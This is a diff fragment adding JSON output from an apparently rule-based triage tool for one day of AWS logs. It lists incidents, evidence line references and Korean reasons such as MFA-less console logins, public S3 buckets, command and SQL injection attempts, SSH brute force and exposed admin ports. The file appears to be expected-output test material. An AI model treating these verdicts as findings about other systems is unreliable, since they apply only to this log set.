+   "last_seen": "2018-08-20T10:30:21+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-047",
+   "start": "2018-08-20T13:23:25+00:00",
+   "end": "2018-08-20T13:23:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "115.238.245.14"
+   ],
+   "n_events": 2,
+   "repeats": 2,
+   "first_seen": "2018-08-20T11:46:21+00:00",
+   "last_seen": "2018-08-20T13:23:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  },
+  {
+   "id": "INC-051",
+   "start": "2018-08-20T13:49:25+00:00",
+   "end": "2018-08-20T13:49:25+00:00",
+   "severity": "medium",
+   "score": 247,
+   "stages": [
+    "initial-access"
+   ],
+   "src_ips": [
+    "58.218.205.75"
+   ],
+   "n_events": 2,
+   "repeats": 2,
+   "first_seen": "2018-08-20T11:30:22+00:00",
+   "last_seen": "2018-08-20T13:49:25+00:00",
+   "rules": [
+    "VPC_REMOTE_ADMIN_EXPOSED"
+   ],
+   "verdict": "risky_not_attack",
+   "verdict_by": "rules"
+  }
+ ],
+ "triage": {
+  "mode": "rules",
+  "incidents": [
+   {
+    "id": "INC-001",
+    "evidence": [
+     "cloudtrail.json:3662",
+     "cloudtrail.json:3663",
+     "cloudtrail.json:3664",
+     "cloudtrail.json:3665",
+     "cloudtrail.json:3666",
+     "cloudtrail.json:3667"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 계정·자원 목록 조회 연속 실행, S3 버킷을 인터넷 전체 또는 다른 계정에 공개(ACL·정책). 결과: 성공 28건, 실패·차단 2건."
+   },
+   {
+    "id": "INC-002",
+    "evidence": [
+     "cloudtrail.json:6401",
+     "cloudtrail.json:6455"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 보안그룹·네트워크 ACL을 0.0.0.0/0에 개방. 결과: 성공 2건."
+   },
+   {
+    "id": "INC-003",
+    "evidence": [
+     "cloudtrail.json:345",
+     "cloudtrail.json:347",
+     "cloudtrail.json:352",
+     "cloudtrail.json:353",
+     "cloudtrail.json:354",
+     "cloudtrail.json:355"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "IAM 사용자·키·권한·DB 관리자 비밀번호 생성/변경, 권한 없는 API를 연속 시도(권한 탐색). 보이는 시도 32건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-004",
+    "evidence": [
+     "access.log:2512"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도, 웹 요청에 SQL 인젝션 패턴. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-005",
+    "evidence": [
+     "alb.log:6"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-006",
+    "evidence": [
+     "alb.log:8"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-007",
+    "evidence": [
+     "access.log:858"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-008",
+    "evidence": [
+     "cloudtrail.json:1181",
+     "cloudtrail.json:1186",
+     "cloudtrail.json:1188",
+     "cloudtrail.json:1189",
+     "cloudtrail.json:1191",
+     "cloudtrail.json:1192"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 계정·자원 목록 조회 연속 실행. 결과: 성공 8건."
+   },
+   {
+    "id": "INC-009",
+    "evidence": [
+     "guardduty_findings.jsonl:1",
+     "vpcflow.log:59569",
+     "vpcflow.log:157004"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-012",
+    "evidence": [
+     "vpcflow.log:27077",
+     "vpcflow.log:27089",
+     "vpcflow.log:27115",
+     "vpcflow.log:27130",
+     "vpcflow.log:27176",
+     "vpcflow.log:124512"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-015",
+    "evidence": [
+     "cloudtrail.json:6037",
+     "cloudtrail.json:6038",
+     "cloudtrail.json:6039",
+     "cloudtrail.json:6041",
+     "cloudtrail.json:6089",
+     "cloudtrail.json:6090"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "계정·자원 목록 조회 연속 실행. 결과: 성공 60건."
+   },
+   {
+    "id": "INC-016",
+    "evidence": [
+     "vpcflow.log:26567",
+     "vpcflow.log:124002",
+     "vpcflow.log:28616",
+     "vpcflow.log:126051",
+     "vpcflow.log:30205",
+     "vpcflow.log:127640"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-017",
+    "evidence": [
+     "vpcflow.log:17818",
+     "vpcflow.log:17856",
+     "vpcflow.log:19948",
+     "vpcflow.log:115253",
+     "vpcflow.log:115291",
+     "vpcflow.log:117383"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-019",
+    "evidence": [
+     "vpcflow.log:36272",
+     "vpcflow.log:133707",
+     "vpcflow.log:41833",
+     "vpcflow.log:139268",
+     "vpcflow.log:42262",
+     "vpcflow.log:139697"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-018",
+    "evidence": [
+     "vpcflow.log:26693",
+     "vpcflow.log:124128",
+     "vpcflow.log:28113",
+     "vpcflow.log:125548",
+     "vpcflow.log:30135",
+     "vpcflow.log:127570"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-020",
+    "evidence": [
+     "vpcflow.log:83625",
+     "vpcflow.log:83660",
+     "vpcflow.log:181060",
+     "vpcflow.log:181095",
+     "vpcflow.log:83739",
+     "vpcflow.log:181174"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-022",
+    "evidence": [
+     "vpcflow.log:27619",
+     "vpcflow.log:125054",
+     "vpcflow.log:30039",
+     "vpcflow.log:127474"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-023",
+    "evidence": [
+     "vpcflow.log:27960",
+     "vpcflow.log:125395",
+     "vpcflow.log:29491",
+     "vpcflow.log:126926"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-025",
+    "evidence": [
+     "vpcflow.log:66078",
+     "vpcflow.log:66137",
+     "vpcflow.log:163513",
+     "vpcflow.log:163572"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-026",
+    "evidence": [
+     "vpcflow.log:84059",
+     "vpcflow.log:181494",
+     "vpcflow.log:84646",
+     "vpcflow.log:182081"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-021",
+    "evidence": [
+     "vpcflow.log:25202",
+     "vpcflow.log:122637",
+     "vpcflow.log:25101",
+     "vpcflow.log:122536"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-024",
+    "evidence": [
+     "vpcflow.log:30696",
+     "vpcflow.log:30740",
+     "vpcflow.log:128131",
+     "vpcflow.log:128175"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-027",
+    "evidence": [
+     "vpcflow.log:5280",
+     "vpcflow.log:102715"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-028",
+    "evidence": [
+     "vpcflow.log:9297",
+     "vpcflow.log:106732"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-030",
+    "evidence": [
+     "vpcflow.log:21069",
+     "vpcflow.log:118504"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-031",
+    "evidence": [
+     "vpcflow.log:23098",
+     "vpcflow.log:120533"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-033",
+    "evidence": [
+     "vpcflow.log:25144",
+     "vpcflow.log:122579"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-034",
+    "evidence": [
+     "vpcflow.log:27230",
+     "vpcflow.log:124665"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-035",
+    "evidence": [
+     "vpcflow.log:26966",
+     "vpcflow.log:124401"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-038",
+    "evidence": [
+     "vpcflow.log:30066",
+     "vpcflow.log:127501"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-040",
+    "evidence": [
+     "vpcflow.log:32192",
+     "vpcflow.log:129627"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-043",
+    "evidence": [
+     "vpcflow.log:34977",
+     "vpcflow.log:132412"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-045",
+    "evidence": [
+     "vpcflow.log:39893",
+     "vpcflow.log:137328"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-046",
+    "evidence": [
+     "vpcflow.log:45529",
+     "vpcflow.log:142964"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-048",
+    "evidence": [
+     "vpcflow.log:46753",
+     "vpcflow.log:144188"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-049",
+    "evidence": [
+     "vpcflow.log:46982",
+     "vpcflow.log:144417"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-050",
+    "evidence": [
+     "vpcflow.log:52005",
+     "vpcflow.log:149440"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-052",
+    "evidence": [
+     "vpcflow.log:58591",
+     "vpcflow.log:156026"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-053",
+    "evidence": [
+     "vpcflow.log:58708",
+     "vpcflow.log:156143"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-054",
+    "evidence": [
+     "vpcflow.log:61681",
+     "vpcflow.log:159116"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-057",
+    "evidence": [
+     "vpcflow.log:76232",
+     "vpcflow.log:173667"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-059",
+    "evidence": [
+     "vpcflow.log:76243",
+     "vpcflow.log:173678"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-060",
+    "evidence": [
+     "vpcflow.log:76297",
+     "vpcflow.log:173732"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-061",
+    "evidence": [
+     "vpcflow.log:81036",
+     "vpcflow.log:178471"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-029",
+    "evidence": [
+     "vpcflow.log:85946",
+     "vpcflow.log:88147"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-047",
+    "evidence": [
+     "vpcflow.log:45834",
+     "vpcflow.log:143269"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-051",
+    "evidence": [
+     "vpcflow.log:57960",
+     "vpcflow.log:155395"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-055",
+    "evidence": [
+     "vpcflow.log:61174",
+     "vpcflow.log:158609"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-062",
+    "evidence": [
+     "vpcflow.log:81853",
+     "vpcflow.log:179288"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-064",
+    "evidence": [
+     "vpcflow.log:88867"
+    ],
+    "verdict": "risky_not_attack",
+    "confidence": "medium",
+    "reason": "인터넷에서 관리 포트(SSH·RDP)로 들어온 접속만 있고, 로그인 성공이나 다른 공격 행동은 보이지 않습니다. 인터넷 스캐너가 흔히 남기는 기록입니다. 관리 포트를 인터넷 전체에 열어 둔 설정을 닫으세요."
+   },
+   {
+    "id": "INC-068",
+    "evidence": [
+     "auth.log:229"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "서버에 새 계정 생성·관리자 그룹 추가. 결과: 성공 1건."
+   },
+   {
+    "id": "INC-069",
+    "evidence": [
+     "auth.log:284",
+     "auth.log:288",
+     "auth.log:292",
+     "auth.log:296",
+     "auth.log:300",
+     "auth.log:304"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "SSH 비밀번호 연속 실패(무차별 대입). 보이는 시도 11건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-070",
+    "evidence": [
+     "access.log:226"
+    ],
+    "verdict": "attack",
+    "confidence": "medium",
+    "reason": "취약점 스캐너·자동 도구 탐지. 결과: 통과 1건. 연결 허용·요청 통과는 있지만 공격이 성공한 근거는 아직 없습니다."
+   }
+  ],
+  "campaigns": [
+   {
+    "incident_ids": [
+     "INC-001",
+     "INC-002"
+    ],
+    "link_reason": "같은 IP, 같은 액세스 키",
+    "summary": "공격 의심 사건 2개 (INC-001, INC-002)"
+   },
+   {
+    "incident_ids": [
+     "INC-003"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-004"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-005"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-006"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-007"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-008"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   },
+   {
+    "incident_ids": [
+     "INC-015"
+    ],
+    "link_reason": "사건 하나",
+    "summary": "공격 의심 사건 1개"
+   }
+  ],
+  "cannot_tell": [
+   "WAF 로그가 없어 웹 공격 요청이 막혔는지는 웹서버 로그로 일부만 볼 수 있습니다.",
+   "ALB 로그는 08-20 14:37 UTC(한국 23:37)에 끝나고, 같은 기간의 다른 로그는 08-20 15:26 UTC(한국 00:26)까지 있습니다. 그 사이의 ALB 기록은 없습니다.",
+   "GuardDuty 로그는 08-20 13:50 UTC(한국 22:50)에 끝나고, 같은 기간의 다른 로그는 08-20 15:26 UTC(한국 00:26)까지 있습니다. 그 사이의 GuardDuty 기록은 없습니다."
+  ],
+  "coverage": {
+   "sources": {
+    "alb": {
+     "n_events": 2051,
+     "first": "2018-08-20T09:24:18.626121+00:00",
+     "last": "2018-08-20T14:37:02.756539+00:00"
+    },
+    "cloudtrail": {
+     "n_events": 6571,
+     "first": "2018-08-20T09:00:00+00:00",
+     "last": "2018-08-20T15:15:20+00:00"
+    },
+    "guardduty": {
+     "n_events": 1,
+     "first": "2018-08-20T13:50:05+00:00",
+     "last": "2018-08-20T13:50:05+00:00"
+    },
+    "sshauth": {
+     "n_events": 65,
+     "first": "2018-08-20T09:08:51+00:00",
+     "last": "2018-08-20T15:08:12+00:00"
+    },
+    "vpcflow": {
+     "n_events": 183296,
+     "first": "2018-08-20T09:00:13+00:00",
+     "last": "2018-08-20T15:26:46+00:00"
+    },
+    "weblog": {
+     "n_events": 3907,
+     "first": "2018-08-20T09:04:13+00:00",
+     "last": "2018-08-20T15:17:39+00:00"
+    }
+   },
+   "missing_sources": [
+    "waf"
+   ],
+   "cloudtrail_s3_object_calls": 0,
+   "suspected_keys": []
+  },
+  "validation": {
+   "passed": true,
+   "note": "규칙 판정은 입력 ref만 씁니다"
+  },
+  "meta": {
+   "model": "rules",
+   "usage": {}
+  }
+ },
+ "rule_triage": {
+  "mode": "rules",
+  "incidents": [
+   {
+    "id": "INC-001",
+    "evidence": [
+     "cloudtrail.json:3662",
+     "cloudtrail.json:3663",
+     "cloudtrail.json:3664",
+     "cloudtrail.json:3665",
+     "cloudtrail.json:3666",
+     "cloudtrail.json:3667"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 계정·자원 목록 조회 연속 실행, S3 버킷을 인터넷 전체 또는 다른 계정에 공개(ACL·정책). 결과: 성공 28건, 실패·차단 2건."
+   },
+   {
+    "id": "INC-002",
+    "evidence": [
+     "cloudtrail.json:6401",
+     "cloudtrail.json:6455"
+    ],
+    "verdict": "attack",
+    "confidence": "high",
+    "reason": "MFA 없는 콘솔 로그인, 보안그룹·네트워크 ACL을 0.0.0.0/0에 개방. 결과: 성공 2건."
+   },
+   {
+    "id": "INC-003",
+    "evidence": [
+     "cloudtrail.json:345",
+     "cloudtrail.json:347",
+     "cloudtrail.json:352",
+     "cloudtrail.json:353",
+     "cloudtrail.json:354",
+     "cloudtrail.json:355"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "IAM 사용자·키·권한·DB 관리자 비밀번호 생성/변경, 권한 없는 API를 연속 시도(권한 탐색). 보이는 시도 32건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-004",
+    "evidence": [
+     "access.log:2512"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
+    "reason": "운영체제 명령 삽입 시도, 웹 요청에 SQL 인젝션 패턴. 보이는 시도 1건은 모두 막히거나 실패했습니다. 공격 시도이지만 급하지 않을 수 있습니다."
+   },
+   {
+    "id": "INC-005",
+    "evidence": [
+     "alb.log:6"
+    ],
+    "verdict": "attack",
+    "confidence": "low",
